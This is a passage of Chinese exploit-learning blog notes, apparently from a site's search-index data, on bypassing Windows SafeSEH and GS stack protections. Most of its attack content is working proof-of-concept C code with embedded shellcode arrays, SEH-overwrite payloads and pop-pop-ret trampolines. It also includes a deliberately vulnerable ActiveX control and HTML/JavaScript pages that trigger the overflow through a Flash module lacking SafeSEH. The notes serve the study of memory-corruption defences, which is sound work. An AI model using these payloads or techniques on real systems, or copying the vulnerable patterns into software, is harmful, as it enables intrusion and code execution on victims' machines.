page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP是否开启，如果系统未开启DEP则返回校验成功，否则程序抛出访问违例的异常。 如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行DEP相关检测，函数依次进行如下校验。 判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP是否开启，如果系统未开启DEP则返回校验成功，否则程序抛出访问违例的异常。 判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。 RtlIsValidHandler()函数检测流程图可行性分析 异常处理函数位于加载模块内存范围之外，DEP关闭 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全S.E.H表为空)，同时相应模块不是纯IL 异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH(安全S.E.H表不为空)，异常处理函数地址包含在安全S.E.H表中 终极方案：将shellcode布置在堆区，即使SEH验证不可行仍旧会调用堆中绕过SEH代码#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;char shellcode[] =&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;;char overflowcode[] = &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\xE0\\xFF\\x12\\x90&quot;&quot;\\x08\\x3E\\x39\\x00&quot; // address of shellcode in heap ;;void test(char * input){ char str[200]; strcpy(str, input); int zero = 0; zero = 1 / zero;}void main(){ char* buf = (char *)malloc(500); strcpy(buf, shellcode); test(overflowcode);}说明 将shellcode放入堆区 栈溢出，将SEH链地址覆写为堆区shellcode的地址 调用SEH，随后自动触发shellcode 注意：注意0的情况，字符串复制是遇到0截止的利用未启用SafeSEH的模块来绕过SafeSEH代码// SEH_NOSafeSEH_JUMP.DLL# include &amp;lt;windows.h&amp;gt;BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ return TRUE;}void jump(){ __asm { pop eax pop eax retn }}// SEH_NOSafeSEH.EXE#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] = &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xEB\\x0E\\x90\\x90&quot; // 220 Byte NOP, retn here, jmp to shellcode&quot;\\x81\\x11\\x12\\x11&quot; // address of pop pop retn in No_SafeSEH module&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; // to prevent SEH chain stack overfill// shellocode&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;DWORD MyException(void){ printf(&quot;There is an exception&quot;); getchar(); return 1;}void test(char* input){ char str[200]; strcpy(str, input); int zero = 0; // prevent overfill, palce it to strcpy back __try { zero = 1 / zero; } __except(MyException()){}}int main(){ HINSTANCE hInst = LoadLibrary(TEXT(&quot;SEH_NOSafeSEH_JUMP.dll&quot;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0;}实验思路 使用VC6编译SEH_NOSafeSEH_JUMP.DLL，这样SEH_NOSafeSEH_JUMP.DLL将不会启用SafeSEH，使用release模式 使用VS2008编译SEH_NOSafeSEH.EXE，这样SEH_NOSafeSEH.EXE将会启用SafeSEH，使用release模式，编译设置为无优化 SEH_NOSafeSEH.EXE的test函数存在明显的栈溢出漏洞，同样要求是shellcode中不能存在0 SEH被覆盖后，制造除0异常，劫持异常处理流程提前处理 由于VC++ 6.0编译的DLL默认加载基址为0x10000000，如果以它作为DLL的加载基址，DLL中pop pop retn指令地址中可能会包含0x00，这会在我们进行strcpy操作时会将字符串截断影响我们shellcode的复制，所以为了方便测试我们需要对基址进行重新设置。在顶部菜单中选择“工程→设置”，然后切换到“连接”选项卡，在“工程选项”的输入框中添加/base:&quot;0x11120000&quot;即可。遇到的问题 跳板将会跳到shellcode中地址的前方4字节处，所以应当将此处放入jmp 经过VS 2008编译的程序，在进入含有__try{}的函数时会在Security Cookie+4的位置压入−2(VC++ 6.0下为−1)，在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成0，进入第二个的时候被修改为1。如果在__try{}块中出现了异常，程序会根据这个值调用相应的__except()处理，处理结束后这个位置的值会重新修改为−2;如里没有发生异常，程序在离开__try{}块时这个值也会被修改回−2。当然这个值在异常处理时还有其他用途。我们只需要知道由于它的存在，我们的 shellcode可能会被破坏，所以在模块地址之后应该放入八个字节的NOP作为保护措施。 从retn回栈地址空间到shellcode本体之间有四个字节的不和谐因素，因此我们需要跳转到shellcode中执行利用加载模块以外的地址绕过SafeSEH 所有的模块都默认开启了SafeSEH跳板 地址 反汇编代码   call/jmpdword ptr[esp+0x8]   call/jmpdword ptr[esp+0x14]   call/jmpdword ptr[esp+0x1c]   call/jmpdword ptr[esp+0x2c]   call/jmpdword ptr[esp+0x44]   call/jmpdword ptr[esp+0x50]   call/jmp dword ptr[ebp+0xc]   call/jmp dword ptr[ebp+0x24]   call/jmp dword ptr[ebp+0x30]   call/jmp dword ptr[ebp-0x4]   call/jmp dword ptr[ebp-0xc]   call/jmp dword ptr[ebp-0x18] 代码#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] = // shellcode start&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;// shellcode end&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; // will be overfile with 00000000 00000000 by {__try __catch}&quot;\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90&quot; // far jump and nop&quot;\\xEB\\xF6\\x90\\x90&quot; // short jump and nop &amp;amp; return here&quot;\\x0B\\x0B\\x29\\x00&quot; // address of call [ebp+30] in outside memory;DWORD MyException(void){ printf(&quot;There is an exception&quot;); getchar(); return 1;}void test(char* input){ char str[200]; strcpy(str, input); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){}}int main(){ test(shellcode); return 0;}漏洞执行流程 缓冲区溢出覆盖SEH链处理地址为模块外的地址绕过SafeSEH 在0x00290B0B处找到了一条call [ebp+0x30]的指令，使用它为跳板跳入shellcode面临的问题 0x00290B0B包含字节0x00，strcpy复制时遇到它将会终止 解决办法：00不能缺，就让它变成shellcode的末尾算了 和上一节一样的问题，经过VS 2008编译的程序，在进入含有__try{}的函数时会在Security Cookie+4的位置压入−2，它将会破坏shellcode，因此我们需要跳过它，它将会覆盖的位置代码中写入了，因此我们要使用它下方的12个字节跳转到真正shellcode的入口，因此要使用两次跳转跳到入口，第一次跳转是为了跳到长跳，第二次的长跳转是为了跳入shellcode利用Adobe Flash Player ActiveX控件绕过SafeSEH原理其实这种方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX 在9.0.124之前的版本不支持SafeSEH，所以如果我们能够在这个控件中找到合适的跳板地址，就完全可以绕过SafeSEH。 Flash插件作为找跳板的模块，因为它未启用安全SEH 我们构造代码模块造成栈溢出漏洞 构造POC html页面调用我们构造的漏洞代码 我们的代码模块溢出覆盖SEH链后，将会跳入我们准备好的Flash代码跳板处 从Flash代码跳板处跳入我们栈区的shellcode 漏洞利用成功代码 下载IE7-for-XP-x86-中文安装包 下载Flash Player ActiveX v9.0.124安装包 创建一个MFC ActiveX控件，我将我创建的工程打包了一份，在此下载 详细设置图 使用Unicode字符集，禁用编译优化选项，在静态库中使用MFC，使用release版本编译void CVulnerAX_SEHCtrl::test(LPCTSTR str){ //AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: 在此添加调度处理程序代码 printf(&quot;moeomu&quot;); //定位该函数的标记 char dest[100]; sprintf(dest, &quot;%s&quot;, str);} VulnerAX_SEH.idl中CVulnerAX_SEHCtrl的类信息的UUID：ACA3927C-6BD1-4B4E-8697-72481279AAEC其它步骤 注册控件：Regsvr32 路径\\控件名.ocx 注册好后我们可以在web页面中以如下方式调用我们的函数&amp;lt;object classid=&quot;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&quot; id=&quot;test&quot;&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;script&amp;gt; test.test(&quot;testest&quot;);&amp;lt;/script&amp;gt;触发漏洞构造POC页面&amp;lt;object classid=&quot;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0&quot; width=&quot;160&quot; height=&quot;260&quot;&amp;gt;&amp;lt;param name=&quot;movie&quot; value=&quot;1.swf&quot; /&amp;gt;&amp;lt;param name=&quot;quality&quot; value=&quot;high&quot; /&amp;gt;&amp;lt;embed src=&quot;1.swf&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;160&quot; height=&quot;260&quot;&amp;gt;&amp;lt;/embed&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;object classid=&quot;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC&quot; id=&quot;test&quot;&amp;gt;&amp;lt;/object&amp;gt;&amp;lt;script&amp;gt; var shellcode = &quot;&quot;; var s = &quot;\\u9090&quot;; while (s.length &amp;lt; 54) { s += &quot;\\u9090&quot;; } s += &quot;\\u3001\\u3008&quot;; s += shellcode; test.test(s);&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;分析 如图，ecx指向的地址0x01DCF4FC是溢出字符串的起始地址，距离栈顶最近的异常函数地址位于0x01DCF610，计算得填充0x114也就是276字节即可覆盖到异常处理函数地址，而第277-280字节放置跳板即可 使用OllyFindAddr插件的Overflow return address-&amp;gt;Find CALL/JMP[EBP+N]选项查找指令，本次实验找到了0x300B2D1C的CALL [EBP+0xC]作为跳板，如图 根据前面的计算把跳板地址放到shellcode相应位置中，保存POC页面，test更改函数如下&amp;lt;script&amp;gt; var s = &quot;\\u9090&quot;; while (s.length &amp;lt; 138) { s += &quot;\\u9090&quot;; } s += &quot;\\u2D1C\\u300B&quot;; test.test(s);&amp;lt;/script&amp;gt; 书上说此时触发除0异常将会转入shellcode跳板处，但是貌似事先未写入除0操作，于是再次编译插件，在test函数中加入除0操作 此时，成功在跳板处断下，EBP寄存器内的值是0x01DCF150，根据跳板指示将跳往跳板地址前的4个字节，在此可以加入一个跳转，而shellcode放到后方，如下所示01DCF60C /EB 06 jmp short 01DCF614 ; jump01DCF60E |90 nop01DCF60F |90 nop01DCF610 |1C 2D sbb al,0x2D ; addr01DCF612 |0B30 or esi,dword ptr ds:[eax] ; addr01DCF614 \\90 nop ; shellcode payload start 最终的test函数如下所示&amp;lt;script&amp;gt; var s = &quot;\\u9090&quot;; while (s.length &amp;lt; 136) { s += &quot;\\u9090&quot;; } s += &quot;\\u06EB\\u9090&quot;; s += &quot;\\u2D1C\\u300B&quot;; s += &quot;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857&quot;; test.test(s);&amp;lt;/script&amp;gt; 成功执行如图" }, { "title": "漏洞学习笔记-012-GS安全编译", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-012-GS%E5%AE%89%E5%85%A8%E7%BC%96%E8%AF%91/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-11-11 16:45:00 +0800", "snippet": "GS安全编译的原理和突破本文来源：Moeomu的博客GS安全编译的保护原理简介 在Vistual Studio 2003(VS 7.0)后，默认启用了这个编译选项 位置：Project -&amp;gt; project Properties -&amp;gt; Configuration Properties -&amp;gt; C/C++ -&amp;gt; Code Generaion -&amp;gt; Buffer Security Check GS在所有函数调用发生时，向栈帧内压入了一个额外的随机DWORD，这个随机数被称为canary，这个随机数就是Security Cookie Security Cookie位于EBP之前，系统还将在.data的内存区域内存放了一个Security Cookie的副本 栈中发生溢出时，Security Cookie将首先被淹没，之后才是EBP和返回地址 在函数返回之前，系统将执行一个额外的安全验证操作，称为Security Check 在安全检查中，系统将比较栈帧中原先存放的Security Cookie的值和.data副本中的值，若两者不吻合说明Security Cookie已被破坏，栈中发生了溢出 检测到栈中发生溢出时，系统将进入异常处理流程，函数不会正常返回，ret指令也不会执行 额外的操作和数据的代价是系统性能的下降，所以以下情况不会应用GS： 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是8字节类型而且不大于4字节 由于这些例外，依旧出现了问题，搜易VS2005 SP1中引入了新的安全标识：#pragma strict_gs_check，它可以堆任意函数添加安全Cookie保证安全 变量重排： 根据局部变量的类型堆变量在栈帧中的位置进行调整，将字符串移动到栈帧的高地址防止字符串溢出时破坏其它的局部变量 还将指针参数和字符串参数赋值到内存的低地址 Security Cookie的细节 以.data节的第一个双字作为Cookie的种子，或称为原始Cookie(所有的函数的Cooike都用这个DWORD生成) 每次运行时Cookie种子都不同 栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie以此作为不同函数之间的区别增加Cookie随机性 函数返回前用ESP还原(异或)出Cookie的种子Security Cookie的问题 基于改写函数指针的攻击很难防御 针对异常处理机制的攻击，GS很难防御 GS是对栈帧的保护，很难防御堆溢出攻击利用未被保护的内存突破GS 测试环境： Visual Studio 2008 Professional Windows XP SP3 测试代码#include &amp;lt;string.h&amp;gt;#include &amp;lt;tchar.h&amp;gt;int vulfuction(char* str){ char arry[4]; strcpy(arry, str); return 1;}int _tmain(int argc, _TCHAR* argv[]){ char* str = &quot;yeah, the function is without GS&quot;; vulfuction(str); return 0;} 按理来说，valfunction不包含4字节以上的缓冲区，所以此函数的栈空间应该是不受保护的，但是实际测试的时候却是有保护的，此问题待解决利用虚函数突破GS 只有函数在返回时才会检查栈，所以可以在函数返回前劫持流程代码#include&quot;string.h&quot;class GSVirtual {public: void gsv(char * src) { char buf[200]; strcpy(buf, src); vir(); } virtual void vir(){}};int main(){ GSVirtual test; test.gsv( &quot;\\x72\\x7A\\x81\\x7C&quot; //address of &quot;pop pop ret&quot; &quot;\\x1A\\x20\\x90\\x90\\x90\\x90\\x90\\x90\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63&quot; &quot;\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7&quot; &quot;\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2&quot; &quot;\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD&quot; &quot;\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C&quot; &quot;\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34&quot; &quot;\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0&quot; &quot;\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B&quot; &quot;\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D&quot; &quot;\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D&quot; &quot;\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; ); return 0;}说明 注意：测试环境为Windows XP SP3，编译版本为Release版本，编译器为Visual Studio 2008，编译选项为禁用编译优化/0d shellcode的前四个字节是以下汇编代码的地址，如果系统不是Windows XP SP3就需要修改pop edipop esiretn 覆写C++的虚表指针，使其指向跳板，如果需要平衡堆栈则寻找系统动态链接库中的一段指令作为跳板跳入shellcode 返回地址是垃圾指令则令其尽量不影响shellcode的执行，此处0x817C则是cmp指令，则此段汇编指令尽量让其不发生数据访问异常 此段shellcode将会弹窗利用SEH突破GS GS并没有保护SEH，所以可以覆写SEH来实现劫持代码#include&amp;lt;stdafx.h&amp;gt;#include&amp;lt;string.h&amp;gt;char shellcode[] =&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;......&quot;&quot;\\x90\\x90\\x90\\x90&quot;&quot;\\xA0\\xFE\\x12\\x00&quot;//address of shellcode;void test(char * input){ char buf[200]; strcpy(buf,input); strcat(buf,input);}void main(){ test(shellcode);}说明 在函数test中存在栈溢出漏洞，变量input在strcpy后将会被覆盖，而strcat将会取得一个非法地址，函数啊将会转入SEH处理流程，我们可以在security_cookie检查之前劫持系统流程 注意：测试环境为Windows 2000 